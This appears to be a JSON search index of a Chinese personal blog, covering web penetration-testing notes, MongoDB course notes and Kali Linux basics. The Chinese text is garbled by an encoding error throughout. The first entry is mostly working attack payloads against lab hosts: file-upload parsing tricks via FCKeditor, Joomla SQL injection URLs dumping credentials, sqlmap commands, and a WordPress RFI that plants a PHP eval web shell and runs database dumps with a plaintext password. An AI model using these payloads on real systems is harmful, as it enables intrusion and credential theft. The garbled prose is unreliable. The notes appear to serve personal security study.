Â∞èÈ©¨ÁöÑÊñá‰ª∂ÂêçËÆæÁΩÆÊàêpp.asp;.jpg  Èò≤Âæ°ÊñπÊ≥ïÔºöÊúçÂä°Âô®‰øùÂ≠òÊñá‰ª∂Êó∂Ëá™Â∑±ÂÆö‰πâÊñá‰ª∂Âêç‰øùÂ≠òÔºå‰∏çÁõ∏‰ø°Áî®Êà∑ÁöÑËæìÂÖ•nginxËß£ÊûêphpÊºèÊ¥û  nginx&lt;=0.8.37,Áî®Êà∑ËÆøÈóÆxxx.jpg/xxx.phpÊó∂ÊúçÂä°Âô®‰ºöÊääxxx.jpgÂΩìÂÅöPHPÊñá‰ª∂Ëß£Êûê‰ΩøÁî®ÁΩëÈ°µÁºñËæëÂô®‰∏≠ÁöÑÊºèÊ¥ûIIS6Ëß£ÊûêÊºèÊ¥ûÊîªÂáªfckeditor/eitor/filemanager/uploadfckeditor/eitor/filemanager/browser/default/connectors/asp/connector.asp  tamperdataÊü•ÁúãÊúçÂä°Âô®ÁâàÊú¨ÂíåÁ±ªÂûãÔºö192.168.1.222/EditNews.html  Êü•ÁúãfckeditorÁâàÊú¨Ôºö192.168.1.222/fckeditor/_whatsnew.html  http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp  http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp&amp;type=Image  192.168.1.222/userfiles/image/fck.asp/littlec01dstudy.jpg  Áõ¥Êé•‰∏ä‰º†littlec01dstudy.asp;.jpgÊñá‰ª∂ÂêåÊ†∑ÂèØ‰ª•Áõ¥Êé•ËøêË°åÊñá‰ª∂ÂÜÖÂÆπ192.168.1.222/userfiles/image/littlec01dstudy.asp;.jpg  ÊàñËÄÖÂú®Â¶Ç‰∏ãurl‰∏≠‰ΩøÁî®Á±ª‰ººÊñπÊ≥ï          192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/test.html      192.168.1.222/fckeditor/editor/filemanager/upload/test.html      192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Com mand=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=%2F      2.8 WebÂ∫îÁî®ÁªÑ‰ª∂ÊîªÂáªKaliÔºö  whatWebWebÂ∫îÁî®ÊúçÂä°ÂíåÊ°ÜÊû∂ÁªÑ‰ª∂ÊîªÂáª      Joomla3.2.1          whatweb/zoomeye/shodan.ioÊêúÁ¥¢Áõ∏ÂÖ≥‰ø°ÊÅØ      Âú®exploit-db.comÊâæÂà∞Áõ∏ÂÖ≥ÊºèÊ¥û                  192.168.10.100/index.php/weblinks-categories?id=0 ) union select password from nnla5_users ‚Äì )          192.168.10.100/index.php/weblinks-categories?id=0 ) union select concat(0x5b,username,0x3a,password,0x5d) from nnla5_users limit 0,1 ‚Äì )          192.168.10.100/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60nnla5_users%60%20‚Äì%20%29          admin:admin123          sqlmap -u ‚Äòhttp://192.168.10.100/index.php/weblinks-categories?id=0‚Äô ‚Äìlevel=3 ‚Äìdbs ÊääÊ≥®ÂÖ•ÁöÑËØ≠Âè•Áî®‰ª£ÊõøÔºå‰ΩøÁî®*ÂëäÁü•sqlmapÂú®ËøôÈáåÊ≥®ÂÖ•ÊàêÂäüÁéáËæÉÈ´ò                          sqlmapÔºöÁõ∏ÊØîlevel1Ôºålevel3ÊòØÂ∞ùËØïÊõ¥Â§öÁöÑÊ≥®ÂÖ•              sqlmap -u ‚Äòhttp://192.168.10.100/index.php/weblinks-categories?id=0*‚Äô ‚Äìlevel=3 ‚Äìdbs                                                wordpress          Kali:wpscan                  ‰∏ªË¶Å‰ΩøÁî®pluginÂíåÊï∞ÊçÆÂ∫ìÁõ∏ÂÖ≥Êåá‰ª§          wpscan -u http://192.168.10.116/wordpress ‚Äìenumerate p          192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;php @eval($_POST[‚Äòcmd‚Äô]);//\twordpress‰∏ÄÂè•ËØùÊú®È©¨          ÁªïËøáÊñπÊ≥ïÔºöRFI to get shell                          192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_POST[‚Äòcmd‚Äô]);?&gt;              data:text/plain,&lt;?php @eval($_POST[‚Äòcmd‚Äô]);?&gt;              data:text/plain,&lt;?php @eval($_POST[‚Äòcmd‚Äô]);//              ÂèëÁé∞ÂèØ‰ª•ÊâßË°åphpinfoÊåá‰ª§Ôºå192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‚Äòcmd‚Äô]);?&gt;&amp;cmd=phpinfo();              192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‚Äòcmd‚Äô]);?&gt;&amp;cmd=passthru(‚Äòmysql -u wordpress -pwp_pass888 -A wordpress -e ‚Äúshow tables;‚Äù‚Äô);              192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‚Äòcmd‚Äô]);?&gt;&amp;cmd=passthru(‚Äòmysql -u wordpress -pwp_pass888 -A wordpress -e ‚Äúselect * from wp_users;‚Äù‚Äô);              passthruÊâßË°åÁ≥ªÁªüÂëΩ‰ª§Âπ∂‰∏îÂõûÊòæÔºö-pÂêéÈù¢‰∏çËÉΩÊúâÁ©∫Ê†ºÔºåË¶ÅÁõ¥Êé•ËøûÊé•ÂØÜÁ†ÅÔºõÂçïÂèåÂºïÂè∑‰ΩøÁî®ÂàÜÂºÄÔºåÂê¶Âàô‰ºö‰∏çÊ≠£Â∏∏Èó≠Âêà                                sqli to get shell                          admin:wp_@dm!n                                Êèí‰ª∂ÂÆûÁé∞WordPressÊ∏óÈÄèÔºöjetpack          ‰∏ä‰º†Êèí‰ª∂Êó∂Âä†ÂÖ•‰∏ÄÂè•ËØùÊú®È©¨          ‰∏ä‰º†Ë∑ØÂæÑÂú®/wordpress/wp-content/plugins/akismet,Âú®ËØ•Ë∑ØÂæÑ‰∏ãÂÆûÁé∞‰∫ÜÊ∏óÈÄè                    ÈóÆÈ¢ò  SQLÊ≥®ÂÖ•Êó∂select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;ÂÆûÈôÖÊÉÖÂÜµÂ¶Ç‰∏ãÈù¢ÁöÑ‰æãÂ≠êselect count(*) from TSafe group by floor(rand(0)*2);          Ë°®‰∏≠ÂøÖÈ°ªÊúâ3Êù°‰ª•‰∏äÁöÑËÆ∞ÂΩïÊâç‰ºöÊä•Èîô      rand()ÂáΩÊï∞ÁöÑÈöèÊú∫Âõ†Â≠êËã•‰∏çÂèñÔºåÂàô‰ºöÈöèÊú∫Êä•ÈîôÔºåËÆæ‰∏∫Âõ∫ÂÆöÂÄºÂ¶Çrand(0)ÔºåÂ¶ÇË°®‰∏≠Êúâ3Êù°‰ª•‰∏äÊï∞ÊçÆÔºåÂ∞±‰∏ÄÂÆöÊä•Èîô„ÄÇ      ÂéüÁêÜÔºö                  ÊâßË°åËØ•Êù°ËØ≠Âè•Êó∂ÔºåÂÖàÂª∫Á´ãËôöË°®          floor(rand(0)*2)ÁöÑËøîÂõûÂÄºÊòØ011011‚Ä¶‰∏îÊü•ËØ¢Êó∂rand()‰ºöË¢´ÂèçÂ§çÊâßË°åÔºåÂç≥Âú®Êü•ËØ¢ËøáÁ®ã‰∏≠ÊØèÊ¨°ÂåπÈÖç‰ºöÈáçÊñ∞ËÆ°ÁÆórand()ÁöÑÂÄº          011011..Á¨¨‰∏ÄÊ¨°Êü•ËØ¢0ÔºåÊ≤°ÊúâÈáçÊñ∞ËÆ°ÁÆó‰∏∫1Ôºå‰∫ßÁîüÁ¨¨‰∏ÄÊù°Êï∞ÊçÆÔºõÁ¨¨‰∫åÊ¨°Êü•ËØ¢1ÔºåÊúâcountÂàôÁõ¥Êé•Âä†1‰∏∫2ÔºõÁ¨¨‰∏âÊ¨°Êü•ËØ¢0Ê≤°ÊúâÈáçÊñ∞ËÆ°ÁÆó‰∏∫1ÔºåÊ≠§Êó∂Êúâ1‰ΩÜÊòØ‰ªçË¶ÅÊèíÂÖ•1ÔºåÈáçÂ§çÊä•Èîô„ÄÇ                      [ÂÖ≥ÈîÆ]Âú®‰ΩøÁî®ËôöÊãüÊú∫ÁöÑÊó∂ÂÄô‰ºöÈÅáÂà∞ÂÜÖÂ≠ò‰∏çË∂≥ÁöÑÊÉÖÂÜµÔºåÁõ¥Êé•‰øÆÊîπVmwareÈáåÁöÑÁ°¨ÁõòÂ§ßÂ∞è‰ºöÂØºËá¥ËôöÊãüÊú∫ÈáçÂêØÂêéÊó†Ê≥ïÂºÄÊú∫„ÄÇËß£ÂÜ≥ÂäûÊ≥ïÊòØÈúÄË¶ÅÈáçÊñ∞ÂàíÂàÜÁ°¨ÁõòÂíåËÆæÁΩÆ‰∫§Êç¢Âå∫Ôºå‰ΩøÁî®fdiskÂíåmkswapÁ≠âÂ∑•ÂÖ∑ÂÆûÁé∞„ÄÇ"
  },
  
  {
    "title": "MongoDBËá™Â≠¶Á¨îËÆ∞",
    "url": "/posts/MongoDB/",
    "categories": "",
    "tags": "Website",
    "date": "2017-11-07 00:00:00 -0800",
    





    
    "snippet": "MongoDB ÂÆûÊàò[Áæé] Kyle Banker1. ‰∏ªË¶ÅÁâπÊÄß1.1 ÊñáÊ°£Êï∞ÊçÆÊ®°ÂûãÁ±ª‰ºº‰∫éJsonÁöÑÊ†ºÂºèÊù•Â≠òÂÇ®Êï∞ÊçÆÔºå‰∏çÈúÄË¶ÅÂÉèÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÈÇ£Ê†∑Âú®ÈÅáÂà∞‰∏ÄÂØπÂ§öÁöÑÊÉÖÂÜµ‰∏ãË¶ÅÂÜôÂ§öÂº†Ë°®„ÄÇ1.2 Âç≥Êó∂Êü•ËØ¢MongoDBÂÆûÁé∞Á±ª‰ººÂç≥Êó∂Êü•ËØ¢ÁöÑÊñπÊ≥ïÔºödb.posts.find({'tags': 'politics', 'vote_count':{'gt': 10}});1.3 ‰∫åÁ∫ßÁ¥¢ÂºïB-tree1.4 Â§çÂà∂ÈÄöËøáÂâØ...",
    "content": "MongoDB ÂÆûÊàò[Áæé] Kyle Banker1. ‰∏ªË¶ÅÁâπÊÄß1.1 ÊñáÊ°£Êï∞ÊçÆÊ®°ÂûãÁ±ª‰ºº‰∫éJsonÁöÑÊ†ºÂºèÊù•Â≠òÂÇ®Êï∞ÊçÆÔºå‰∏çÈúÄË¶ÅÂÉèÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÈÇ£Ê†∑Âú®ÈÅáÂà∞‰∏ÄÂØπÂ§öÁöÑÊÉÖÂÜµ‰∏ãË¶ÅÂÜôÂ§öÂº†Ë°®„ÄÇ1.2 Âç≥Êó∂Êü•ËØ¢MongoDBÂÆûÁé∞Á±ª‰ººÂç≥Êó∂Êü•ËØ¢ÁöÑÊñπÊ≥ïÔºödb.posts.find({'tags': 'politics', 'vote_count':{'gt': 10}});1.3 ‰∫åÁ∫ßÁ¥¢ÂºïB-tree1.4 Â§çÂà∂ÈÄöËøáÂâØÊú¨ÈõÜÁöÑÊãìÊâëÁªìÊûÑÂÆûÁé∞Â§çÂà∂ÂäüËÉΩ„ÄÇÂâØÊú¨ÈõÜÊúâ‰∏Ä‰∏™‰∏ªËäÇÁÇπÂíåÂ§ö‰∏™‰ªéËäÇÁÇπÁªÑÊàêÔºå‰∏ªËäÇÁÇπÂèØ‰ª•ËØªÂÜô„ÄÅÂ≠êËäÇÁÇπÂè™ËÉΩËØªÔºõËã•‰∏ªËäÇÁÇπÊïÖÈöúÔºåÂàôËá™Âä®‰ªéÂ≠êËäÇÁÇπÊâæÊõø‰ª£„ÄÇ1.5 ÈÄüÂ∫¶ÂíåÊåÅ‰πÖÊÄßÈÄüÂ∫¶ÊåáÊìç‰ΩúÊï∞ÊçÆÁöÑÊó∂Èó¥Â§öÂ∞ëÔºõÊåÅ‰πÖÊÄßÊåáÊï∞ÊçÆËÉΩÁª¥ÊåÅÁöÑÊó∂Èó¥ÈïøÁü≠ÔºõMongoDBÂèØ‰ª•ËÆæÁΩÆÊòØÂê¶ÂºÄÂêØJournalingÊó•ÂøóËÆ∞ÂΩï1.6 Êï∞ÊçÆÂ∫ìÊâ©Â±ïÂàÜÁâá1.7 ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑  Â§á‰ªΩÂíåÊÅ¢Â§çÊï∞ÊçÆÂ∫ì:mongodump/mongorestore  ÂØºÂÖ•ÂØºÂá∫JSON/CSV/TSVÊï∞ÊçÆ: mongoexport/mongoimport2. MongoDB ShellÂ∏∏Áî®Êåá‰ª§  db.users.save()/db.users.insert()\tÊ∑ªÂä†È°π  db.users.count()\tËÆ°Êï∞  db.users.find()\t\tÊü•ËØ¢  db.users.update({username:\"smith\"}, {$set: {country: \"Canada\"}})\tÂ¢ûÂä†ÂõΩÂÆ∂Â±ûÊÄß  db.users.update( {username: \"smith\"}, { $set: {favorits: { cities:[\"Chicago\", \"Cheyenne\"], movies: [\"Casablanca\", \"The Sting\"] } }})  db.users.remove()\t\tÂà†Èô§Êï∞ÊçÆ  db.users.drop()\t\tÂà†Èô§ÊâÄÊúâÁ¥¢Âºï  db.numbers.ensureIndex({num:1}) \t‰∏∫numÈîÆÂàõÂª∫Á¥¢Âºï  Êï∞ÊçÆÂ∫ìÂü∫Êú¨Êìç‰Ωú          show dbs      show collections      db.stats()/db.numbers.stats()\tËé∑ÂèñÊï∞ÊçÆÂ∫ì/ÈõÜÂêàÂ∫ïÂ±Ç‰ø°ÊÅØ      3. ‰ΩøÁî®MongoDBÁºñÂÜôÁ®ãÂ∫èrubyMongoDBÊùÉÂ®ÅÊåáÂçó[Áæé]Kristina Chodorow &amp; Michael DirolfMongoDB UniversityM101P: MongoDB for DevelopersChapter 1: Introduction1.1 db.collection.insert(), db.collection.find().pretty() we can use pretty() to configure the cursor to display results in an easy-to-read format.1.2 cursor.hasNext()/next() is used to list the whole collections by the cursor.1.3 del(g['name']) is uesd to delete a item in a python dictionary.1.4 curl -i locolhost:8080 can get a header and content back.1.5 set cookie which is got by Get methodfruit = bottle.request.forms.get(\"fruit\")bottle.response.set_cookie(\"fruit\", fruit)bollle.redirect(\"/show_fruit\") Chapter 3: Schema Design3.1 foreign key constraintsChapter 4: Performance4.1 Pluggable storage engines inclues MMAP(default) and WiredTiger(2014)  WiredTiger: Document Level Concurrency, Compress on data4.2 Index  create Index: db.students.createIndex({student_id:1});  delete Index: db.students.dropIndex({student_id:1});create Index on tags      elemMatch: db.students.explain().find({'scores':{$elemMatch: {type:'exam'. score:{'$gt':99.8}}}}); it is used to meet the requirements in the search.    create unique index: db.stuff.createIndex({thing:1}, {unique:true});  delete the same item: db.stuff.remove({thing:'apple'}, {justOne: true});  sparse index: can not be used for sorting  create the Index in the background: db.students.createIndex({'scores.score':1},{background:true});  Explain: Verbosity  Covered Queries: search require and result are all index          all the fields in the query are part of an index;      all the fields returned in the results are in the same index      db.collection.find(query, projection): query(query requirement), projection(display return keys)        Geospatial Index:          ensure Index: db.stores.ensureIndex({location: 2d, type:1});      db.stores.find({location:{$near:[50,50]}});        Geospatial Spherical: Longitude, Latitude. Using GeoJSON          db.places.ensureIndex({'location':  '2dsphere'});      db.places.find({location: {$near: {$geometry: {type: \"Point\", coordinates: [122,37]}, $masDistance: 2000}}});      db.stores.find({loc: {$near: {$geometry: {type: \"Point\", coordinates: [-130,39]}, $maxDistance: 1000000}}});        Text Indexes: db.sentences.ensureIndex({'words': 'text'});          db.sentences.find({$text:{$search:'dog tree obsidian'}}, {Score:{$meta: 'textScore'}}).sort({score:{$meta:'textScore'}}); The command will list the text by the similarity of the words.      db.students.dinf({student_id:{$gt: 500000}, class_id: 54}).sort({student_id:1}).hint({class_i:1}).explian(\"executionStats\")      query order: equality-sort-range      4.3 Profile mode  0: nolog  1: log slow query  2: log every query  command: mongod -dbpath /usr/local/var/mongodb --profile 1 --slowms 2  db.system.profile.find({ns:/test.foo/}).sort({ts:1}).pretty()  db.system.profile.find({millis:{$gt:1}}).sort({ts:1}).pretty()Answer4.3db.posts.ensureIndex({ date : -1});db.posts.ensureIndex({ tags : 1,  date : -1});db.posts.ensureIndex({ permalink : 1});5. Aggregation Framework5.1 count the sum:db.products.aggregate([\t{ $group: \t\t{\t\t\t\"_id:\"$category\", \t\t\t\"num_products\":{\"$sum\":1}\t\t}\t}]); 5.2 aggregation pipeline  $project  $match  $group  $sort  $skip  $limit  $unwind  $out  $redata  $geonear5.3 aggregation expressions aggregate([stage1, stage2],{options})  $sum: db.zips.aggregate([{\"$group\": {\"_id\":\"$state\",\"population\":{$sum:\"$pop\"}}}]), sum population grouped as state  $avg: db.zips.aggregate([{$group: {\"_id\":\"$state\",\"average_pop\":{$avg:\"$pop\"}}}])  $min  $max: db.zips.aggregate([{$group: {_id: \"$state\", pop: {$max:\"$pop\"}}}])  $push  $addtoSet: db.zips.aggregate([{$group: {\"_id\":\"$city\", \"postal_codes\":{$addToSet:\"$_id\"}}}])  $first/$last: must be used after sorts      $project      db.products.aggregate([      {$project:   \t{   \t\t_id:0,   \t\t'maker': {$toLower:\"$manufacturer\"},   \t\t'details': {'category': \"$category\",          \t\t\t\t'price' : {\"$multiply\":[\"$price\",10]}          \t\t\t},   \t\t'item':'$name'   \t}      }  ])      If you want to include a key exactly as it is named in the source document, you just write key:1, where key is the name of the key.db.zips.aggregate([{$project: {_id: 0, city: {$toLower: \"$city\"}, pop:1, state:1, zip:\"$_id\"}}])  $match: db.zips.aggregate([{$match: { pop: {$gt:100000}}}])  $text:  $sort: db.zips.aggregate([{ $sort:{state:1, city:1}}])  $unwind: unjoin the data  $out:(new in Mongodb2.6),rewrite the collection  {explain:true},{allowDiskUse:true}5.4 Homework5.4.1 db.posts.aggregate([{$unwind: \"$comments\"},{$group:{_id: \"$comments.author\",count : {$sum:1}}},{$sort:{count:-1}}]) This task need to count the comments‚Äô author‚Äôs sum which is in the subJson. Need to be rejoin the whole Json.5.4.2 the result is smaller than the correct answer but it is near. Do not figure out the reason.db.zips.aggregate([\t{$match:{ $or: [{state:\"CA\"}, {state:\"NY\"}]}},\t{$match: {pop: {$gt:25000}}},\t{$group: {_id:0, avg: {$avg:\"$pop\"}}}])5.4.3db.grades.aggregate([\t{ $unwind: \"$scores\" },\t{ $match: { $or: [ {\"scores.type\": \"homework\"}, {\"scores.type\":\"exam\"} ] } },\t{ $group: { _id: { 'student_id': \"$student_id\", 'class_id': \"$class_id\" }, avg: { $avg: \"$scores.score\" } } },\t{ $group: { _id: \"$_id.class_id\", class_avg: { $avg: \"$avg\" } } },\t{ $sort: { 'class_avg': -1 } }])5.4.4db.zips.aggregate([{ $project: { _id: 0, city: 1, pop: 1 } },{ $match: { city: /^(B|D|O|G|N|M).*/ } },{ $group: { _id: null, pop: { $sum: \"$pop\" } } },{ $sort: { city: 1} }])5.5 the different between $group and $project6. Application Engineering6.1 Write Concern:  w: whether the application wait for the server‚Äôs acknowledge during the response. 1(wait)/0(not)  j: whether the application wait for the server‚Äôs response on writing the disk. Ture(wait)/False(not)6.2 Replica Set# script to create 3 replica sets: sudo bash &lt; ./create_replica_set.sh#!/usr/bin/env bashmkdir -p /data/rs1 /data/rs2 /data/rs3mon\tgod --replSet m101 --logpath \"1.log\" --dbpath /data/rs1 --port 27017 --oplogSize \t64 --fork --smallfilesmongod --replSet m101 --logpath \"2.log\" --dbpath /data/rs2 --port 27018 --oplogSize \t64 --smallfiles --forkmongod --replSet m101 --logpath \"3.log\" --dbpath /data/rs3 --port 27019 --oplogSize \t64 --smallfiles --fork# init the replica setconf\tig = { _id: \"m101\", members:[          { _id : 0, host : \"localhost:27017\"},          { _id : 1, host : \"localhost:27018\"},          { _id : 2, host : \"localhost:27019\"} ]};rs.initiate(config);rs.status();  Reading from a secondary set: rs.slaveOk()(rs means replica set)  connect to different database: mongo --port 27017/8/9  secondaries use oplog to synchronize the primary dataset.  shut down the dataset: rs.stepDown()6.3 Failover and Rollback"
  },
  
  {
    "title": "ÂÆâÂÖ®Á¨îËÆ∞Ê¶ÇËÆ∫",
    "url": "/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "Security",
    "date": "2017-10-27 00:00:00 -0700",
    





    
    "snippet": "1 Ê¶ÇËÆ∫  ÊîªÂáªÊµÅÁ®ã          È¢ÑÊîªÂáªÔºöÊî∂ÈõÜ‰ø°ÊÅØÔºåËøõË°åÂÜ≥Á≠ñ      ÊîªÂáªÔºöËøõË°åÊîªÂáªÔºåËé∑ÂæóÊùÉÈôêÔºåËøõË°åÊ∏óÈÄè      ÂêéÊîªÂáªÔºöÈïøÊúüÊéßÂÆàÔºåÁª¥ÊåÅÊùÉÈôêÔºåÊ∂àÈô§ÁóïËøπ        APTÊîªÂáªÔºàÈ´òÁ∫ßÊåÅÁª≠ÊÄßÊîªÂáªÔºâ          ÂÆöÂêë‰ø°ÊÅØÊî∂ÈõÜÔºöÈíàÂØπÊÄßÊî∂ÈõÜÔºåÂåÖÊã¨ÁΩëÁªúÈöêËîΩÊâ´ÊèèÂíåÁ§æÂ∑•ÊñπÊ≥ï      Â§ñÁΩëÊîªÂáªÁ™ÅÁ†¥ÔºöÊÅ∂ÊÑè‰ª£Á†ÅÊîªÂáª‰∏™‰∫∫ÁªàÁ´ØÊàñËÄÖÂçï‰ΩçÊúçÂä°Âô®      ÊûÑÂª∫ÊéßÂà∂ÈÄöÈÅìÔºöÈááÁî®HTTP„ÄÅHTTPS„ÄÅDNS...",
    "content": "1 Ê¶ÇËÆ∫  ÊîªÂáªÊµÅÁ®ã          È¢ÑÊîªÂáªÔºöÊî∂ÈõÜ‰ø°ÊÅØÔºåËøõË°åÂÜ≥Á≠ñ      ÊîªÂáªÔºöËøõË°åÊîªÂáªÔºåËé∑ÂæóÊùÉÈôêÔºåËøõË°åÊ∏óÈÄè      ÂêéÊîªÂáªÔºöÈïøÊúüÊéßÂÆàÔºåÁª¥ÊåÅÊùÉÈôêÔºåÊ∂àÈô§ÁóïËøπ        APTÊîªÂáªÔºàÈ´òÁ∫ßÊåÅÁª≠ÊÄßÊîªÂáªÔºâ          ÂÆöÂêë‰ø°ÊÅØÊî∂ÈõÜÔºöÈíàÂØπÊÄßÊî∂ÈõÜÔºåÂåÖÊã¨ÁΩëÁªúÈöêËîΩÊâ´ÊèèÂíåÁ§æÂ∑•ÊñπÊ≥ï      Â§ñÁΩëÊîªÂáªÁ™ÅÁ†¥ÔºöÊÅ∂ÊÑè‰ª£Á†ÅÊîªÂáª‰∏™‰∫∫ÁªàÁ´ØÊàñËÄÖÂçï‰ΩçÊúçÂä°Âô®      ÊûÑÂª∫ÊéßÂà∂ÈÄöÈÅìÔºöÈááÁî®HTTP„ÄÅHTTPS„ÄÅDNSÁ≠âÂçèËÆÆÔºåÁªïËøáÂÆâÂÖ®Èò≤Êä§ËÆæÂ§á      ÂÜÖÈÉ®Ê®™ÂêëÊ∏óÈÄèÔºö‰ª•ÁªàÁ´Ø‰∏ªÊú∫ÂíåDMZÂå∫ÔºåÂú®Á≥ªÁªüÂÜÖÈÉ®Â§öÂ±ÇÊ∏óÈÄèÔºåÊîªÂáªÊõ¥Â§öÊúçÂä°Âô®Ëé∑ÂæóÊõ¥Â§öÊùÉÈôê„ÄÇ      Êï∞ÊçÆÊî∂ÈõÜ‰∏ä‰º†      ÊîªÂáªÁóïËøπÊ∏ÖÁêÜ        Áü•ËØÜÊ°ÜÊû∂          ‰ø°ÊÅØÊî∂ÈõÜ      Á™ÅÈò≤ÊîªÂáª      ÈöêËîΩÊéßÂÆà      2. Kali LinuxÂü∫Á°Ä2.1 linuxÂàÜÊîØ* RedHat\t* CentOS\t*  RedHat* Debian\t* Ubuntu \t* Linxu* Slackware* Êü•ÁúãÂÜÖÊ†∏ÁâàÊú¨Âè∑\t* uname -a\t* cat /proc/version cat /etc/issue\t* cat /etc/os-release 2.2 KaliÂü∫Á°Ä‰ªãÁªç  LinuxÊñá‰ª∂ÁõÆÂΩïÁªìÊûÑ          etc ÈÖçÁΩÆÁõÆÂΩï      bin Áî®Êà∑Ëá™Â∏¶ÁöÑÂèØÊâßË°åÊñá‰ª∂ or /usr/bin      boot ÂºïÂØº      media ËôöÊãüÊú∫ÂÖ±‰∫´ÁõÆÂΩï      mnt \tUÁõòÂä†ËΩΩÁõÆÂΩï      proc Êü•ÁúãËøõÁ®ã‰ø°ÊÅØ      sbin\tÁ≥ªÁªüËá™Â∏¶ÁöÑÂèØÊâßË°åÊñá‰ª∂ÔºàsystemÔºâ      tmp ‰∏¥Êó∂ÁõÆÂΩïÔºàÈáçÂêØÂÖ®ÈÉ®Ê∏ÖÁ©∫ÔºåÊâÄÊúâÁî®Êà∑ÈÉΩËÉΩËØªÂÜôÔºâ      usr Áî®Êà∑ÂÆâË£ÖËΩØ‰ª∂ Â∑•ÂÖ∑Âú®/usr/shareË∑ØÂæÑ‰∏ã        KaliÂü∫Êú¨Êìç‰Ωú          ifconfig                  loÔºöÊú¨Âú∞ÂõûÁéØ127.0.0.1                    lnÂàõÂª∫ÈìæÊé•                  Á°¨ÈìæÊé•ÔºöÊñá‰ª∂ÁöÑ‰∏§‰∏™ÂâØÊú¨          Á¨¶Âè∑ÈìæÊé•ÔºöÂø´Êç∑ÊñπÂºè ln -s Ê∫êÊñá‰ª∂ ÈìæÊé•Êñá‰ª∂                    moreÔºöÊåâÈ°µÊòæÁ§∫Êñá‰ª∂      lessÔºöÊåâÈ°µÊòæÁ§∫Êñá‰ª∂ÔºåÂèØ‰ª•ÁøªÈ°µ      head -n fileÔºöÊòæÁ§∫Êñá‰ª∂ÂâçnË°å      tail -n fileÔºöÊòæÁ§∫Êñá‰ª∂ÂêénË°å      umask ËÆæÁΩÆÊñá‰ª∂ÊùÉÈôêÂ±èËîΩ‰ΩçÔºåÂèñÂèçÂç≥ÊòØÊñ∞Âª∫Êñá‰ª∂ÈªòËÆ§ÊùÉÈôê      chown user file ‰øÆÊîπÊñá‰ª∂ÊâÄÊúâËÄÖ      chgrp ‰øÆÊîπÊñá‰ª∂ÊâÄÊúâÁªÑ              ÂØπÂ∫îÂêéÁºÄÁöÑÊñá‰ª∂Âä†ÂØÜ                                            ÂëΩ‰ª§              Êñá‰ª∂ÂêéÁºÄ                                                          gzip,gunzip              .gz                                      zip,unzip              .zip                                      tar              .tar                                      compress,bzip2              .bz2                                          Á£ÅÁõòÁÆ°ÁêÜÂëΩ‰ª§                  du ÊòæÁ§∫Êñá‰ª∂ÂíåÁõÆÂΩïÁ©∫Èó¥Âç†Áî®ÊÉÖÂÜµ          df ÊòæÁ§∫Á£ÅÁõòÊñá‰ª∂Á≥ªÁªüÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ          mount/umount ÂÆâË£Ö/Âç∏ËΩΩÊñá‰ª∂Á≥ªÁªü                    Áî®Êà∑ÁÆ°ÁêÜ                  id ÊòæÁ§∫ÂΩìÂâçÁî®Êà∑‰ø°ÊÅØ          adduser Â¢ûÂä†Áî®Êà∑          passwd \tÊõ¥ÊîπÁî®Êà∑ÂØÜÁ†Å          userdel\tÂà†Èô§Áî®Êà∑          traceroute ÊµãËØïÂíåËøúÁ®ã‰∏ªÊú∫ÁöÑË∑ØÁî±ÊÉÖÂÜµ          ps ÊòæÁ§∫ËøõÁ®ãÂèäÁä∂ÊÄÅ          kill [ËøõÁ®ãid]ÊùÄÊ≠ªËøõÁ®ã                      netstat -t\t//Âè™ÁúãtcpËøûÊé•          netstat -nt //‰∏çÂ∞ÜIPÂú∞ÂùÄÂèçÂêëËß£Êûê‰∏∫‰∏ªÊú∫ÂêçÊàñÂüüÂêç      netstat -ant\t//Êú¨Êú∫ÁõëÂê¨ËøûÊé•ÔºàallÔºâ      netstat -antp  //process‰∏éËøõÁ®ãÂÖ≥ËÅîËµ∑Êù•      windowsÔºö netstat -an -p tcp      ps -aux | grep 2120 //ÊâìÂç∞ÊâÄÊúâËøõÁ®ãÔºåÂåπÈÖç2120ËøõÁ®ã      postgresql 5432Á´ØÂè£        ÁΩëÂç°ÈÖçÁΩÆ(ÈÖçÁΩÆÈùôÊÄÅIPÂú∞ÂùÄ)Ôºö          ‰øÆÊîπÁΩëÂç°ÈÖçÁΩÆ/etc/network/interfaces                  auto eth0          iface eth0 inet static          address 192.168.80.30          netmask          geteway                    ‰øÆÊîπÂüüÂêçÊúçÂä°Âô®Âú∞ÂùÄ /etc/resolv.conf      ÈáçÂêØÁΩëÁªú: /etc/init.d/networking restart or reboot        Kali ÊúçÂä°ÁÆ°ÁêÜ          WebÊúçÂä°Âô®Ê†πÁõÆÂΩï /var/www/html/      apache2/postgresql      ÈÖçÁΩÆÊúçÂä°Ëá™ÂêØÂä®Ôºöupdate-rc.d postgresql enable            ÊõøÊç¢Êõ¥Êñ∞Ê∫ê‰∏∫ÂõΩÂÜÖÊ∫ê/etc/apt/sources.list      ‰∏≠ÁßëÂ§ßkaliÊ∫ê  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  ÈòøÈáå‰∫ëkaliÊ∫ê  deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib  deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib    * advanced package tool(apt)   * apt-get update/upgrade 